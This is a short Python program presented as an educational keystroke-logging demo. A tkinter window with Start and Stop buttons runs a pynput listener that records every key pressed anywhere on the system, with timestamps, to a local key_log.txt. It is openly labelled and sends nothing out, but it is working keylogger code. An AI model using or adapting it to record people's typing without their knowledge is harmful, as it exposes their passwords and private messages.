import tkinter as tk
from pynput import keyboard
from datetime import datetime
import os

# -------- File Path --------
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE_DIR, "key_log.txt")

listener = None
logging_active = False

# -------- Log Function --------
def write_log(key):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"{datetime.now()} : {key}\n")

def on_press(key):
    if logging_active:
        write_log(key)

# -------- Control Functions --------
def start_logging():
    global listener, logging_active
    if not logging_active:
        logging_active = True
        status_label.config(text="Status: Logging ON", fg="green")
        listener = keyboard.Listener(on_press=on_press)
        listener.start()

def stop_logging():
    global listener, logging_active
    logging_active = False
    status_label.config(text="Status: Logging OFF", fg="red")
    if listener:
        listener.stop()

# -------- GUI --------
root = tk.Tk()
root.title("Keystroke Logging Demonstration")
root.geometry("420x250")
root.resizable(False, False)

tk.Label(
    root,
    text="Keystroke Logging Demo (Educational Purpose)",
    font=("Arial", 14, "bold")
).pack(pady=10)

tk.Button(
    root,
    text="Start Logging",
    bg="green",
    fg="white",
    width=20,
    command=start_logging
).pack(pady=10)

tk.Button(
    root,
    text="Stop Logging",
    bg="red",
    fg="white",
    width=20,
    command=stop_logging
).pack(pady=5)

status_label = tk.Label(
    root,
    text="Status: Logging OFF",
    fg="red",
    font=("Arial", 11)
)
status_label.pack(pady=10)

tk.Label(
    root,
    text="Logs saved in key_log.txt",
    fg="gray"
).pack()

root.mainloop()
